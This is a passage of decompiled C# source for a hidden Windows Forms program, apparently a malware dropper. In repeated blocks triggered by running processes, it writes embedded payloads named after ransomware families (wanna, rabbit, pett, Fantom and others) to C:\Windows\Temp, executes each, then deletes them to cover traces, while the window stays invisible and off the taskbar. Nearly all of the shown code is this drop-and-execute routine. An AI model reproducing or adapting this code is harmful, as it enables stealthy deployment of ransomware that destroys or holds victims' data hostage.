			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName38.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName39.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName40.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName41.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName42.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName43.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName44.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName45.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(54, 28));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
